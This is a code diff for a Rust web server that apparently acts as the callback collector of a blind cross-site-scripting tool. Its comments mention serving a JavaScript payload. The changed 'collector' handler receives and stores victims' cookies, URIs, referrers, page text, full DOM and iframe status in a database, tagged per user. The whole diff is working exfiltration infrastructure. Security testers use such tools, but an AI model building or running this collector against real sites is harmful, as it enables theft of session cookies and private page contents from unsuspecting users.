@@ -1,10 +1,10 @@
 use crate::State;
 use axum::{
-    body::Body,
-    extract::{ConnectInfo, Extension, Path},
-    http::{HeaderMap, Request},
+    extract::{ConnectInfo, Extension, Json, Path},
+    http::{HeaderMap, StatusCode},
     response::IntoResponse,
 };
+use serde::Deserialize;
 use std::net::SocketAddr;
 
 // deliver the javascript payload from GET
@@ -21,47 +21,54 @@ pub async fn probe(
     )
 }
 
+#[derive(Deserialize)]
+pub struct CallbackData {
+    uri: String,
+    cookies: String,
+    referrer: String,
+    user_agent: String,
+    origin: String,
+    title: String,
+    text: String,
+    dom: String,
+    was_iframe: String,
+    // screenshot: String,
+}
+
 // collect info from probe
 pub async fn collector(
     Extension(state): Extension<State>,
     Path(user): Path<String>,
     ConnectInfo(peer): ConnectInfo<SocketAddr>,
+    Json(data): Json<CallbackData>,
     headers: HeaderMap,
-    body: String,
-) {
-    println!("hit");
-    let mut headers = format!("{:?}", headers);
-    let mut body = body;
+) -> impl IntoResponse {
+    println!("HIT\nHIT\nHIT");
 
-    println!("{body}");
+    sqlx::query(
+        "INSERT INTO pages
+            (username, peer, headers,
+             uri, cookies, referrer,
+             user_agent, origin, title,
+             text, dom, was_iframe)
+        VALUES
+            (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+    )
+    .bind(user)
+    .bind(peer.to_string())
+    .bind(format!("{:?}", headers))
+    .bind(data.uri)
+    .bind(data.cookies)
+    .bind(data.referrer)
+    .bind(data.user_agent)
+    .bind(data.origin)
+    .bind(data.title)
+    .bind(data.text)
+    .bind(data.dom)
+    .bind(data.was_iframe)
+    .execute(&state.db_pool)
+    .await
+    .unwrap();
 
-    // trim to fit in database
-    if headers.len() > 1024 {
-        headers = (headers[0..1024]).to_string();
-    }
-    if body.len() > 1024 {
-        body = (body[0..1024]).to_string();
-    }
-
-    sqlx::query("INSERT INTO pages (username, origin, headers, body) VALUES (?, ?, ?, ?)")
-        .bind(user)
-        .bind(peer.to_string())
-        .bind(headers)
-        .bind(body)
-        .execute(&state.db_pool)
-        .await
-        .unwrap();
+    StatusCode::OK
 }
-
-// this is if we want to identify by hostname
-
-// let recipient = body
-//     .headers()
-//     .get("host")
-//     .unwrap()
-//     .to_str()
-//     .unwrap()
-//     .split(".")
-//     .into_iter()
-//     .next()
-//     .unwrap();
